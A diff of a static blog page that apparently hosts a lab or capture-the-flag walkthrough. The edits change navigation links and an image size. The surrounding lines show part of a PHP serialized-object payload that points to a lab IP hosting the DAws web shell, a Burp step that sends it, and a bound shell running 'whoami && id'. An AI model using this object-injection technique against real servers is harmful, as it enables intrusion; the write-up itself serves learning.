@@ -28,8 +28,9 @@
 		<div id="menu">
 			<div class="menu-navigation-container">
 				<ul id="menu-navigation" class="menu">
-						<li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/pages/about.html">About</a></li>
 						<li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/pages/all-posts.html">All posts</a></li>
+						<li  class="active" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://twitter.com/binaryheadache">Twitter</a></li>
+						<li  class="active" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://github.com/svenito">Github</a></li>
 
 				</ul>
 			</div> <!--/#menu-navigation-container-->
@@ -473,7 +474,7 @@ O:4:&quot;Test&quot;:3:{s:3:&quot;url&quot;;s:30:&quot;http://192.168.56.101/DAw
 </pre>
 <p>Using Burp suite I use a <code>GET</code> request to <code>sec.php</code>, send it to <code>Repeater</code> and convert
 it to a <code>POST</code> request with the required payload:</p>
-<img alt="" src="http://i.imgur.com/kiutbRt.png" />
+<img alt="" src="http://i.imgur.com/kiutbRt.png" style="width: 500px;" />
 <p>Then I, once again, browse to my DAws url and bind a shell to finally get:</p>
 <pre class="code console literal-block">
 <span class="gp">#</span> whoami <span class="o">&amp;&amp;</span> id
